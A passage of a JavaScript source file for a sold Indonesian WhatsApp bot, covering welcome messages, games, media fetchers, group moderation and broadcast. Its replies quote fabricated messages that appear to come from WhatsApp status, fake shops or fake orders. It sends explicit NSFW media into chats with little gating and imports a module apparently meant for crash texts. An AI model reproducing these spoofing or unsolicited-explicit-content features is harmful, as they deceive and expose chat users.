/*
HELLO NGAB YANG BELI SC GW
WELCOME TO MY SC
SC YANG DIMANA SALAH DIKIT BOT NYA KAGA NGERESPON
MADE BY YUSUFRMDN
Proses membuat Nya Membutuhkan waktu : 5 hari☺️👌
THANKS TO KASIH NAMA GW
prefix : multi
button cmd baru kebuat 7 hari wkwk
☠️YusufRmdn☠️
donate : https://saweria.co/yusufzbot
my whatsapp : 0895704368804
Thankss!!
*/

const {
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
} = require('@adiwajshing/baileys')
const { color, bgcolor } = require('./lib/color')
const speed = require('performance-now')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { fetchJson, fetchText } = require('./lib/fetcher')
const request = require('request')
const { recognize } = require('./lib/ocr')
const { help } = require('./lib/help')
const { virtex } = require('./lib/virtex.js')
let areatext = require ('./lib/teks')
const _sewa = require("./lib/sewa")
const fs = require('fs')
const crypto = require('crypto')  
const moment = require('moment-timezone')
const { exec, spawn, execSync } = require("child_process")

const settings = JSON.parse(fs.readFileSync("./settings.json"));
const nomorbot = settings.nomorbot
numown = settings.nomorowner 
nodana = settings.dana 
nogopay = settings.gopay 
nopulsa = settings.pulsa 
namabot = settings.namabot 
faketoko = settings.faketoko
namaown = settings.namaowner 
spykey = 'SpyBotApi' // Free Apikey:)
lolkey = settings.LolKey
zekskey = settings.ZeksKey
session = settings.sessionName
imgfake = settings.imgfake
thumb = settings.logobotnya
footertext = settings.FakeTeks
blocked = [] // jan diganti

/********** DATABASE **********/
const prem = JSON.parse(fs.readFileSync('./src/premium.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const ban = JSON.parse(fs.readFileSync('./src/banned.json'))
const sewa = JSON.parse(fs.readFileSync('./src/sewa.json'))
let _scommand = JSON.parse(fs.readFileSync('./src/scommand.json'))
const _antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))

/********* TIME *********/
function kyun(seconds){
            function pad(s){
            return (s < 10 ? '0' : '') + s;
            }
            var hours = Math.floor(seconds / (60*60));
            var minutes = Math.floor(seconds % (60*60) / 60);
            var seconds = Math.floor(seconds % 60);
            return `${pad(hours)}J ${pad(minutes)}M ${pad(seconds)}D`
            }
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Good night🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Good afternoon'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Good afternoon'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Good afternoon'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Good morning'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Good Night'
 } 
    
            
/********** KONEKAN *********/
async function starts() {
        	const yusufz = new WAConnection()
            yusufz.version = [2, 2119, 6] 
	        yusufz.logger.level = 'warn'
	        console.log(banner.string)
        	yusufz.on('qr', () => {
     		console.log(color('[','white'), color('!','red'), color(']','white'), color('Scan QRnya Bwang'))
	        })
	        fs.existsSync(`./${session}.json`) && yusufz.loadAuthInfo(`./${session}.json`)
	        yusufz.on('connecting', () => {
		    start('2', 'Sedang Nyambungin bang....')		   
        	})
	        yusufz.on('open', () => {
	    	success('2', 'Tersambung')
	    	setTimeout( () => {
	    	console.log(color(`WELCOME TO MY SC\nApikey : Free\nNomor bot lu : ${nomorbot}`, 'aqua'))
	    	}, 1000)    		    	     	
         	})         	
         	yusufz.sendMessage(`${numown}@s.whatsapp.net`, `- SUKSES AKTIF -\n✓Made By NYX`, MessageType.text)
        	await yusufz.connect({timeoutMs: 30*1000})
            fs.writeFileSync(`./${session}.json`, JSON.stringify(yusufz.base64EncodedAuthInfo(), null, '\t'))
	        yusufz.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	        for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))     	
	        }
        	})
        yusufz.on("CB:Call", json => {
		let call;
		calling = JSON.parse(JSON.stringify(json))
		call = calling[1].from
		setTimeout(function(){
			yusufz.sendMessage(call, 'Maaf, saya tidak bisa menerima panggilan. Telfon = block!.\nJika ingin membuka block harap chat Owner!\nhttps//wa.me/62895704368804', MessageType.text)
			.then(() => yusufz.blockUser(call, "add"))
			}, 100);
		})
/************GRUP WELKUM*********/
            yusufz.on('group-participants-update', async(chat) => {
        try {
            mem = chat.participants[0]
            try {
                var pp_user = await yusufz.getProfilePicture(mem)
            } catch (e) {
                var pp_user = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
            }
            try {
                var pp_group = await yusufz.getProfilePicture(chat.jid)
            } catch (e) {
                var pp_group = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
            if (chat.action == 'add') {
            	ini_user = yusufz.contacts[mem]
                group_info = await yusufz.groupMetadata(chat.jid)
                let buff = await getBuffer(pp_user)
                welfom = `*Hai @${mem.split('@')[0]}*\n◪ Welcome in group:*\n*├─ ${group_info.subject}*\n_~ Semoga Betah Yaa_`
                await yusufz.sendMessage(chat.jid, buff, MessageType.image, { caption: welfom , contextInfo: {"mentionedJid": [mem],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
                }
                if (chat.action == 'remove') {
            	mem = chat.participants[0]
            	ini_user = yusufz.contacts[mem]
                let buff = await getBuffer(pp_user)
                group_info = await yusufz.groupMetadata(chat.jid)
                ini_out = `Bye bye🥳 @${mem.split('@')[0]}`
                await yusufz.sendMessage(chat.jid, buff, MessageType.image, { caption: ini_out, contextInfo: {"mentionedJid": [mem],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
                }
                if (chat.action == 'promote') {
            	mem = chat.participants[0]
            	ini_user = yusufz.contacts[mem]
                let buff = await getBuffer(pp_user)
                pastihy = `[ PROMOTE DETECTED ]\n- User : @${mem.split('@')[0]}`
                await yusufz.sendMessage(chat.jid, buff, MessageType.image, { caption: pastihy, contextInfo: {"mentionedJid": [mem],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
                }
                if (chat.action == 'demote') {
            	mem = chat.participants[0]
            	ini_user = yusufz.contacts[mem]
                let buff = await getBuffer(pp_user)
                sukasuka = `[ DEMOTE DETECTED ]\n- User @${mem.split('@')[0]}\n\nKasian Di Demote Wkwk`
                await yusufz.sendMessage(chat.jid, buff, MessageType.image, { caption: sukasuka, contextInfo: {"mentionedJid": [mem],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
            }
        } catch (e) {
            console.log('Error :', e)
        }
    })
// Sewa

             _sewa.expiredCheck(yusufz, sewa)
             
             // Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./src/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}
             
/********* SECURITY ********/

            yusufz.on('chat-update', async (mek) => {
      		try {
            if (!mek.hasNewMessage) return
            mek = mek.messages.all()[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked		
		 mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
	        const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, groupInviteMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const wita = moment.tz('Asia/Makassar').format("HH:mm:ss")
            const wit = moment.tz('Asia/Jayapura').format("HH:mm:ss")
            const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
			const prefix = /^[°•π÷♚×¶∆£¢€¥®™✓=|~zZ+×_*!#$%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$,|`÷?;:%abcdefghijklmnopqrstuvwxyz%^&./\\©^]/gi) : '-'
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
			var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const q = args.join(' ')
	      	runtime = process.uptime()   
	      	const fake3 = `${namabot}` 	
	      	const mek1 = {
		    key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '6283136505591-1614953337@g.us' } : {}) }, message: { 'imageMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/png', 'caption': fake3, 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync(`${imgfake}`)} } }	
        	const isCmd = body.startsWith(prefix)             
            const tescuk = ["0@s.whatsapp.net"]
			const botNumber = yusufz.user.jid
			const ownerNumber = [`${numown}@s.whatsapp.net`] 
			const isGroup = from.endsWith('@g.us')
			const totalchat = await yusufz.chats.all()
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await yusufz.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isOwner = ownerNumber.includes(sender)
	    	        const isAntiLink = isGroup ? _antilink.includes(from) : false
			const isBanned = ban.includes(sender)
			const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			const isPrem = prem.includes(sender) || false
            pushname = yusufz.contacts[sender] != undefined ? yusufz.contacts[sender].vname || yusufz.contacts[sender].notify : undefined
            let d = new Date
            let locale = 'id'
            let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
            let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
            let week = d.toLocaleDateString(locale, { weekday: 'long' })
            let date = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
            let waktu = d.toLocaleDateString(locale, { hour: 'numeric', minute: 'numeric', second: 'numeric' })            		
							    // here button function
        selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''

        responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
            
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? yusufz.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : yusufz.sendMessage(from, teks.trim(), extendedText, { quoted: nay, contextInfo: { "mentionedJid": memberr } })
			}
		    const fak2 = {
		    key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "caption": `MAAF FITUR ${command} TIDAK TERDAFTAR DIDALAM MENU`} } }
		    const fak3 = {
            key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "caption": `SIMI-SIMI CHAT\nCHAT OTOMATIS`} } }            			
		    const costum = (pesan, tipe, target, target2) => {
			yusufz.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}				
			const reply = (teks) => {
				yusufz.sendMessage(from, teks, text, {quoted: mek1})
			}
			const eitss = (teks) => {
				yusufz.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `ERROR FITUR. LAPORKAN SEGERA!!!!` }}})
			}			
			const sendMess = (hehe, teks) => {
				yusufz.sendMessage(hehe, teks, text)
			}
			 mess = {
				wait: '```Wait a minutes...```',
				success: '```Success```',
				error: {
				 bug: '```An Error Occurred Try Contacting Owner To Report Error```',
				stick: '```Failed, an error occurred while converting the image to a sticker, try again```',
				Iv: '```Invalid link```',
			    proses: '✍️Sedang membuat...',
			    berhasil: '✔️Berhasil ngab...'
				},
			only: {
				group: '```Sorry, this command can only be used in groups```',
				benned: '```Sorry, your number has been banned, contact the bot owner to open your ban```',
				ownerG: '```Sorry, this command can only be used by the group owner```',
				ownerB: '```Sorry, this command can only be used by the bot owner```',
				premium: '```Sorry, this feature is only for premium users```',
				userB: `Hai ${pushname} You are not registered in the database, please type ${prefix}verify`,
				admin: '```Sorry, this command can only be used by group admins```',
				Badmin: '```Sorry this command can only be used when the bot is admin```',
	                              }		

			}  
            
            const kapan2 = ['Hari ini','Mungkin besok','1 Minggu lagi','Masih lama','3 Bulan lagi','7 Bulan lagi','3 Tahun lagi','4 Bulan lagi','2 Bulan lagi','1 Tahun lagi','1 Bulan lagi','Coba ulangi']
            const tomxic = ["ajg","asu","Ajg","Asu","anjg","Anjg","olol","antek","elaso","Babi","babi","ontol","kntl","kintil","emek","entod","ngontol","memek","mmk"]
			const apa = ['Ya','Mungkin','Tidak','Coba Ulangi']
			const ftoko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) }, message: { 'productMessage': { 'product': { 'productImage':{ 'mimetype': 'image/jpeg', 'jpegThumbnail': fs.readFileSync(`${imgfake}`) }, 'title': `${faketoko}`, 'productImageCount': 10 }, 'businessOwnerJid': `0@s.whatsapp.net`}},contextInfo:{"forwardingScore": 999, "isForwarded": true}}
			const fkontak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `Hai ${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Hai ${pushname},;;;\nFN:Hai ${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`${imgfake}`), thumbnail:fs.readFileSync(`${imgfake}`),sendEphemeral: true}}}
            const ftroli ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "6283136505591-1614953337@g.us"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`${imgfake}`), surface: 200, message: `Hai ${pushname}`, orderTitle: 'NYX', sellerJid: '0@s.whatsapp.net'}}}
            var chat1 = `0@s.whatsapp.net`
		    var split = `ALL CHAT BOTZ`
		    var chat2 =         {
			contextInfo:   {
			participant: chat1,
			quotedMessage: {
			extendedTextMessage: {
	    	text: split,
	     	}
     		}
	    	}
               }
            if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirim linkgrup. kamu ku kick yah:(`)
setTimeout(() => {
yusufz.groupRemove(from, [kic]).catch((e) => { reply(`Bot Harus Jadi Admin`) })
}, 0)
               }
               buff = fs.readFileSync('./src/kontol.mp3')
               if (budy.includes("kontol")) {
               yusufz.sendMessage(from, buff, MessageType.audio, {quoted: ftoko, mimetype: 'audio/mp4', ptt:true})
                    }
   	        tchat = `Total : ${totalchat.length}`   	            	                   
            const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + `FN:${namaown}\n` 
            + `ORG: Developer ${namabot};\n`
            + `TEL;type=CELL;type=VOICE;waid=${numown}:+${numown}\n`
            + 'END:VCARD' /*
            ____________________________
            INI BUAT AUTHOR JADI JGN
            DI UBAHH YAAAA OKEYY            
            */const vcontact = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + `FN: YusufRmdn\n` 
            + `ORG: AUTHOR;\n`
            + `TEL;type=CELL;type=VOICE;waid=62895704368804:+62895704368804\n`
            + 'END:VCARD' 
            colors = ['red', 'pink', 'white', 'black', 'blue', 'yellow', 'green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')			 			  
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			const isQuotedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m=\x1b[1;37m>', '[\x1b[1;32m➻\x1b[1;37m]', color('Name', 'red'), color(pushname, 'yellow'), color('Currently', 'white'), color('Using', 'yellow'), color('Features', 'red'), color('➻', 'yellow'), color(command), 'In :', color('Private Chat', 'yellow')) 
			if (isCmd && isGroup) console.log('\x1b[1;31m=\x1b[1;37m>', '[\x1b[1;32m➻\x1b[1;37m]', color('Name', 'red'), color(pushname, 'yellow'), color('Currently', 'white'), color('Using', 'yellow'), color('Features', 'red'), color('➻', 'yellow'), color(command), 'In :', color(groupName, 'yellow'))
			  
			let thumnael = await getBuffer(`https://i.ibb.co/z2LF0BL/20211011-183018.jpg`)
		
// button
// jan disebarin bro mentang mentang lu beli
const sendButton = async (from, context, fortext, but, mek) => {
            buttonMessages = {
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 1
            }
            yusufz.sendMessage(from, buttonMessages, buttonsMessage, {
                quoted: ftoko
            })
        }
        const adyt = { 
"title": `Hallo ${pushname}`,
"body": `hy`, 
"mediaType": "2", 
"mediaUrl": "https://youtu.be/dGPunkP-XwY", 
"thumbnail": fs.readFileSync(`./${imgfake}`)
}
        const sendButImage = async (from, context, fortext, img, but, mek) => {
            jadinya = await yusufz.prepareMessage(from, img, image)
            buttonMessagesI = {
                imageMessage: jadinya.message.imageMessage,
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 4
            }
            yusufz.sendMessage(from, buttonMessagesI, buttonsMessage, {
                quoted: ftoko,
                contexInfo: adyt
            })
        }
        
			yusufz.chatRead(from, "read")
			
			premi = 'Gratisan☠️'
			
			if (isOwner) {
				premi = 'Owner ⚔️'
		    }
		   if (isPrem) {
				premi = 'Premium ⚔️'
		    }
           switch (command) {
/******** YANG NYURI ANAK HARAM ********/
/******** KALAU GAK ADA THANKS TO NAMA GW SIH *********/
           case 'help':
           case 'menu':                    
  buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
thu = await yusufz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)

groups = yusufz.chats.array.filter(v => v.jid.endsWith('g.us'))

privat = yusufz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))

ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`


uptime = process.uptime();

timestampe = speed();

totalChat = await yusufz.chats.all()

latensie = speed() - timestampe




menu =`${namabot}



${ucapanWaktu} ${pushname} 👋



Hai Saya ${namabot}
Yang Memudahkan Seperti
Membuat Sticker Dan Menjaga 
Group 

「 𝑪𝑨𝑳𝑬𝑵𝑫𝑨𝑹 」

🐥 Day : ${week} ${weton} 
🐥 Date : ${date}


📝「 𝑩𝑶𝑻 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」

▹ Speed : *${latensie.toFixed(4)} _Second_*

▹ Active : *${runtime}*

▹ Platfrom : *Android*

▹ Total Chats : ${totalChat.length}


👤 「 𝒀𝑶𝑼𝑹 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」

▹ Username: *${pushname}*

▹ Sender : *@${sender.split('@')[0]}*

▹ Bio Info : *${thu.status}*

▹ Premium : *${isPrem ? 'Ya' : 'No'}*

▹ Admin : *${isGroupAdmins ? 'Ya' : 'No'}*



Jangan Lupa Follow: instagram.com/wardah_alieyna/`
                          but = [
          { buttonId: `${prefix}allmenu`, buttonText: { displayText: '♚ ALL MENU' }, type: 1 },
          { buttonId: `${prefix}randomenu`, buttonText: { displayText: '♞ RANDOM MENU' }, type: 1 },
          { buttonId: `${prefix}listmenubutt`, buttonText: { displayText: '👉MENU SELANJUTNYA' }, type: 1 }
        ]
        sendButImage(from, menu, trans, buff, but)
           break
/**********RANDOM**********/
case 'apakah':

if (isBanned) return reply(mess.only.benned)
              apakah = body.slice(1)

              const apa =['Iya','Tidak','Bisa Jadi','Iyain Aja Deh Kasian :v','Yo Nggak Tau:v']

              const kah = apa[Math.floor(Math.random() * apa.length)]

              yusufz.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: mek1 })

              break
case 'kapankah':

if (isBanned) return reply(mess.only.benned)
              kapankah = body.slice(1)

              const kapan =['1 hari lagi','2 hari lagi','kapanpun','1 tahun lagi','2 tahun lagi','1 minggu lagi','1 bulan lagi','2 bulan lagi','2 jam lagi','sekarang','24 jam lagi','5 jam lagi','4 minggu lagi','gak mungkin','ya nggak tau sayakan ikan']

              const ya = kapan[Math.floor(Math.random() * kapan.length)]

              yusufz.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ ya, text, { quoted: mek1 })

              break
case 'lusiapa':

if (isBanned) return reply(mess.only.benned)

              const lu =['Monyet','ayam','kucing','bot','Manusia bodo-_','ikan']

              const siapa = lu[Math.floor(Math.random() * lu.length)]

              yusufz.sendMessage(from, '*Pertanyaan :* akusiapa\n*Jawaban :* '+ siapa, text, { quoted: mek1 })

              break
case 'quotes':
if (isBanned) return reply(mess.only.benned)
anjy = await fetchJson(`https://spybot-api.herokuapp.com/api/randomquote?apikey=${spykey}`)
gaksuka = `${anjy.result.quotes}`
yusufz.sendMessage(from, gaksuka, text, {quoted: mek1})
break
case 'meme':
if (isBanned) return reply(mess.only.benned)
ano = await fetchJson(`https://spybot-api.herokuapp.com/api/random/meme?apikey=${spykey}`)
inibaf = await getBuffer(`${ano.result.url}`, {method: 'get'})
inicapt = `${ano.result.title}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}meme`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, inicapt, trans, inibaf, but)
break
case 'wallpaper':
if (isBanned) return reply(mess.only.benned)
reply(`Sedang Mencari Wallpaper ngab...`)
anoh = await fetchJson(`https://spybot-api.herokuapp.com/api/random/wallpaper?apikey=${spykey}`)
nahbaff = await getBuffer(`${anoh.result.url}`, {method: 'get'})
tekss = `Ini Bang Jan Lupa Donasi Yo`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}wallpaper`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, tekss, trans, nahbaff, but)
break
case 'quotesislami':
if (isBanned) return reply(mess.only.benned)
anu = await fetchJson(`https://spybot-api.herokuapp.com/api/randomquote/muslim?apikey=${spykey}`)
tekss = `${anu.result.text_id}`
yusufz.sendMessage(from, tekss, text, {quoted: mek1})
break
/*********RANDOM NSFW**********/
case 'hentaigif':
if (isBanned) return reply(mess.only.benned)
reply(`Tunggu Bang ${pushname}`)
anuh = await fetchJson(`https://spybot-api.herokuapp.com/api/nsfw/hentaigif?apikey=${spykey}`)
baff = await getBuffer(`${anuh.result}`, {method: 'get'})
tekss = `Siapkan sabun bang:v`
yusufz.sendMessage(from, baff, sticker, {quoted: mek1})
break
case 'yuri':
if (isBanned) return reply(mess.only.benned)
if (!isPrem) return reply(`KHUSUS PREMIUM!!`)
reply(`Proses Ngab`)
amnu = await fetchJson(`https://spybot-api.herokuapp.com/api/nsfw/yuri?apikey=${spykey}`)
buff = await getBuffer(`${amnu.result}`, {method: 'get'})
teksz = `Siapkan Sabun:v`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}yuri`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, teksz, trans, buff, but)
break
case 'neko':
if (isBanned) return reply(mess.only.benned)
reply(`Proses Ngab`)
amnu = await fetchJson(`https://spybot-api.herokuapp.com/api/nsfw/nsfwNeko?apikey=${spykey}`)
buff = await getBuffer(`${amnu.result}`, {method: 'get'})
tekss = `Siapkan Sabun:v`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}neko`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, tekss, trans, buff, but)
break
case 'bc': 
					if (!isOwner) return reply(ind.ownerb()) 
					if (args.length < 1) return reply('.......')
					anu = await yusufz.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await yusufz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							yusufz.sendMessage(_.jid, buff, image, {caption: `*「 PESAN BROADCAST 」*\n\n${body.slice(4)}`})
						}
						reply('*Suksess broadcast* ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「  ${namabot} BROADCAST 」*\n\n${body.slice(4)}`)
						}
						reply('*Suksess broadcast* ')
					}
					break
case 'grup':
		case 'group':
					if (!isGroup) return reply(`Khusus grup`)
					if (!isGroupAdmins) return reply(`khusus admin grup`)
					if (!isBotGroupAdmins) return reply(`Bot Harus Menjadi admin`)
					if (args[0] === 'buka') {
					    reply(`*BERHASIL MEMBUKA GROUP*`)
						yusufz.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						reply(`*BERHASIL MENUTUP GROUP*`)
						yusufz.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break      
/***********DOWNLOADER**********/
					case 'ytmp3':
					if (isBanned) return reply(mess.only.benned)
					if (args.length < 1) return reply(`Gini, ${prefix}ytmp3 https://youtu.be/v0ej6EJGqos`)
					linkdia = body.slice(7)
					reply(`Tunggu Bang....`)
					anoh = await fetchJson(`https://spybot-api.herokuapp.com/api/yutub/audio?url=${linkdia}&apikey=${spykey}`)
					baff = await getBuffer(`${anoh.result.result}`)
					tamneln = await getBuffer(`${anoh.result.thumb}`)
					tekss = `${anoh.result.title}\n\n${anoh.result.result}\n\n_Audio akan dikirimkan, maksimal 3 menit_`
					yusufz.sendMessage(from, tamneln, image, {quoted: mek1, caption: tekss})
					yusufz.sendMessage(from, baff, audio, {quoted: mek1})
					break
/**********MAKER**********/
case 'shortlink':
if (isBanned) return reply(mess.only.benned)
